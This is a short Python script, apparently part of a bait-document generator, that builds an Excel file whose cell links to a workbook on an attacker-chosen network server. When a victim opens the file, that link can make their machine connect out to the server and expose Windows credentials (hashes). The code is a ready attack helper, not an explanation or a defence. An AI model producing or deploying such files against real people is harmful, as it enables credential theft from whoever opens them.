#!/usr/bin/env python
# -*- coding: utf-8 -*-

import xlsxwriter


def create_xlsx_externalcell(generate, server, filename):
    workbook = xlsxwriter.Workbook(filename)
    worksheet = workbook.add_worksheet()
    worksheet.write_url(
        "AZ1",
        "external://"
        + server
        + "\\share\\[Workbookname.xlsx]SheetName'!$B$2:$C$62,2,FALSE)",
    )
    workbook.close()
    print("Created: " + filename + " (OPEN)")
